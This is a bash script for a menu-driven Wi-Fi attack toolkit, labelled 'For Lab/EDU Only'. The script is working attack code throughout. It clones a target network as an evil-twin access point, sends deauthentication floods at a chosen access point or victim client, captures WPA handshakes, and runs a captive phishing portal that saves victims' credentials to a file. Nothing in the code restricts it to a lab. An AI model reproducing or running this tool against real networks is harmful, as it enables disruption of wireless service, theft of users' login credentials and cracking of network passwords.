#!/bin/bash

#======== COLORS ========#
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
CYAN='\033[1;36m'
NC='\033[0m'

set -e

AP_CONF="configs/hostapd.conf"
DNS_CONF="configs/dnsmasq.conf"
PHISH_PORTAL="phishing_portal"
LOGDIR="logs"
[ -d "$LOGDIR" ] || mkdir "$LOGDIR"

function cleanup() {
    echo -e "${CYAN}[*] Cleaning up: Killing Rogue AP, DNS/DHCP Server, captures${NC}"
    sudo pkill hostapd || true
    sudo pkill dnsmasq || true
    sudo pkill airodump-ng || true
    sudo pkill aireplay-ng || true
    sudo pkill -f "python3 $PHISH_PORTAL/server.py" || true
    sudo iptables -F
    sudo iptables -t nat -F
    sudo systemctl restart NetworkManager || sudo service network-manager restart
    sudo ip link set "$IFACE" down 2>/dev/null || true
    echo -e "${GREEN}[✓] Teardown complete. Network should be restored.${NC}"
}

trap cleanup EXIT

function banner() {
    clear
    echo -e "${BLUE}"
    echo "  ___  _  _ ___ _  _ _      _        _       _       _             "
    echo " |_ _|| \\| | __| \\| | |    /_\\  _ _| |_ ___| |___  | |___ ___ ___ "
    echo "  | | | .\` | _|| .\` | |__ / _ \\| ' \\  _/ _ \\ / -_) | / -_|_-</ -_)"
    echo " |___||_|\\_|___|_|\\_|____/_/ \\_||_|\\__\\___/_\\___| |_\\___/__|\\___|"
    echo -e "${CYAN}        Wi-Fi Threat Simulator - For Lab/EDU Only ${NC}"
    echo ""
}

function prompt_iface(){
    echo -e "${CYAN}Available interfaces supporting monitor/AP mode:${NC}"
    iw dev 2>/dev/null | awk '/Interface/ {print NR") " $2}'
    read -p "Select interface number: " ifaceidx
    IFACE=$(iw dev 2>/dev/null | awk '/Interface/ {print $2}' | sed -n "${ifaceidx}p")
}

function gen_configs() {
    mkdir -p configs
    cat > "$AP_CONF" <<EOF
interface=$IFACE
driver=nl80211
ssid=$FAKESSID
hw_mode=g
channel=$CHANNEL
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=$FAKEPASS
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF

    cat > "$DNS_CONF" <<EOF
interface=$IFACE
dhcp-range=10.0.0.10,10.0.0.250,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
listen-address=10.0.0.1
EOF
}

#---- 1. scan WiFi insterfaces ----#

function scan_wifi_interfaces_and_networks() {
    echo -e "${CYAN}Available wireless interfaces:${NC}"
    iw dev 2>/dev/null | awk '/Interface/ {print " - " $2}'
    echo
    echo -e "${CYAN}Scanning for nearby WiFi networks (may take a few seconds):${NC}"
    for iface in $(iw dev 2>/dev/null | awk '/Interface/ {print $2}'); do
        echo -e "${YELLOW}[Interface: $iface]${NC}"
        sudo iw "$iface" scan | grep -E 'SSID:|primary channel' | awk '
            /primary channel:/ {chan=$3}
            /SSID:/ {printf "  SSID: %-30s Channel: %s\n", substr($0, index($0,$2)), chan}'
    done
    echo
    read -p "Press Enter to return to menu..."
}

#---- 2. Start Evil Twin AP ----#
function start_rogue_ap(){
    prompt_iface
    read -p "SSID to Clone (target): " FAKESSID
    read -p "Channel (e.g. 6): " CHANNEL
    read -p "Set WPA2 Key (fake, for realism): " FAKEPASS

    echo -e "${YELLOW}[!] Setting up interface $IFACE, assigning 10.0.0.1${NC}"
    sudo ip link set "$IFACE" down
    sudo ip addr flush dev "$IFACE"
    sudo ip link set "$IFACE" up
    sudo ip addr add 10.0.0.1/24 dev "$IFACE"
    sudo pkill hostapd || true
    gen_configs

    echo -e "${CYAN}[*] Starting rogue hostapd (fake AP)... (/tmp/hostapd.log)${NC}"
    sudo hostapd "$AP_CONF" > /tmp/hostapd.log 2>&1 &
    sleep 2

    echo -e "${CYAN}[*] Starting DHCP+DNS... (/tmp/dnsmasq.log)${NC}"
    sudo dnsmasq -C "$DNS_CONF" > /tmp/dnsmasq.log 2>&1 &
    sudo iptables -t nat -A POSTROUTING -o "$IFACE" -j MASQUERADE 2>/dev/null || true
    sudo iptables -A FORWARD -i "$IFACE" -j ACCEPT 2>/dev/null || true

    echo -e "${GREEN}[+] Evil Twin running, captive portal accessible at 10.0.0.1${NC}"
}

#---- 3. Deauth ----#
function deauth_attack() {
    prompt_iface
    read -p "AP BSSID (target): " BSSID
    read -p "Channel: " CH
    sudo ip link set "$IFACE" down
    sudo iw "$IFACE" set monitor control
    sudo ip link set "$IFACE" up
    echo -e "${CYAN}[*] Scanning with airodump-ng (ctrl+c to stop as soon as you see clients) ...${NC}"
    sudo airodump-ng -c "$CH" --bssid "$BSSID" "$IFACE"
    echo -e "${YELLOW}[!] Enter STATION MAC (client MAC) for targeted deauth, or leave empty to broadcast to all:${NC}"
    read -p "Victim STATION MAC (leave empty for broadcast): " STATION
    if [ -z "$STATION" ]; then
        sudo aireplay-ng --deauth 25 -a "$BSSID" "$IFACE"
    else
        sudo aireplay-ng --deauth 25 -a "$BSSID" -c "$STATION" "$IFACE"
    fi
}

#---- 4. Handshake Capture ----#
function handshake_capture() {
    prompt_iface
    read -p "AP BSSID (target): " BSSID
    read -p "Channel: " CH
    TS=$(date +%Y%m%d_%H%M%S)
    OUTFILE="$LOGDIR/handshake_$TS"
    echo -e "${CYAN}[*] Capturing handshakes (write ctrl+c when you see one)... (output: $OUTFILE.cap)${NC}"
    sudo airodump-ng -c "$CH" --bssid "$BSSID" -w "$OUTFILE" "$IFACE"
}

#---- 5. Phishing Portal ----#
function phishing_portal() {
    echo -e "${CYAN}[*] Launching captive portal at http://10.0.0.1 ...${NC}"
    cd "$PHISH_PORTAL"
    sudo python3 server.py &
    cd ..
    echo -e "${GREEN}[+] Captive portal running. Credentials will be saved to phishing_portal/captured_creds.txt${NC}"
    read -p "Press Enter to kill captive portal and return to menu..."
    pkill -f "python3 $PHISH_PORTAL/server.py"
}

#---- 6. Menu/Teardown ----#
while true; do
    banner
    echo -e "${BLUE}1) Scan WiFi interfaces & networks${NC}"
    echo -e "${BLUE}2) Start Rogue AP (Evil Twin)${NC}"
    echo -e "${BLUE}3) Deauth client(s) from real AP${NC}"
    echo -e "${BLUE}4) Capture WPA Handshake (.cap)${NC}"
    echo -e "${BLUE}5) Launch Captive Phishing Portal${NC}"
    echo -e "${BLUE}6) SAFE TEARDOWN/RESET${NC}"
    echo -e "${BLUE}7) Exit${NC}"
    echo -ne "${CYAN}Your choice [1-7]: ${NC}"; read CHOICE
    case $CHOICE in
        1) scan_wifi_interfaces_and_networks ;;
        2) start_rogue_ap ;;
        3) deauth_attack ;;
        4) handshake_capture ;;
        5) phishing_portal ;;
        6) cleanup ;;
        7) echo -e "${GREEN}Bye!${NC}"; exit 0 ;;
        *) echo -e "${RED}[!] Invalid option.${NC}" ;;
    esac
    read -p "Press Enter to return to menu..."
done
